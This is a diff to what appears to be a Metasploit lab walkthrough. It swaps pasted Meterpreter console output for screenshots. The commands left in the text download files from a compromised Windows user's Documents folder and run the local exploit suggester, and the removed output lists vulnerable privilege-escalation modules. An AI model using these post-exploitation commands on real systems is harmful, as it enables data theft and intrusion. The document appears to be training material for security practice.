@@ -122,18 +122,9 @@ Found 1 result...
 
 
       > Answer:  meterpreter > download 'c:\Users\IEUser\Documents\Drinks.recipe.txt'
-	  
-[*] Downloading: c:\Users\IEUser\Documents\Drinks.recipe.txt -> Drinks.recipe.txt
-[*] Downloaded 48.00 B of 48.00 B (100.0%): c:\Users\IEUser\Documents\Drinks.recipe.txt -> Drinks.recipe.txt
-[*] download   : c:\Users\IEUser\Documents\Drinks.recipe.txt -> Drinks.recipe.txt
 
-meterpreter > download 'c:\Users\IEUser\Documents\user.secretfile.txt'
-[*] Downloading: c:\Users\IEUser\Documents\user.secretfile.txt -> user.secretfile.txt
-[*] Downloaded 161.00 B of 161.00 B (100.0%): c:\Users\IEUser\Documents\user.secretfile.txt -> user.secretfile.txt
-[*] download   : c:\Users\IEUser\Documents\user.secretfile.txt -> user.secretfile.txt
-meterpreter >
+![Meterpreter Download](/Screenshots/Meterpreter-download.PNG "Meterpreter Download")
 
- 
 
 8. You can also use Meterpreter's local exploit suggester to find possible exploits.
 
@@ -142,12 +133,8 @@ meterpreter >
 
 meterpreter > run post/multi/recon/local_exploit_suggester
 
-[*] 192.168.0.20 - Collecting local exploits for x86/windows...
-[*] 192.168.0.20 - 30 exploit checks are being tried...
-[+] 192.168.0.20 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
-[+] 192.168.0.20 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+![Meterpreter Download](/Screenshots/Meterpreter-post.PNG "Meterpreter Download")
 
- 
 #### Bonus
   
  
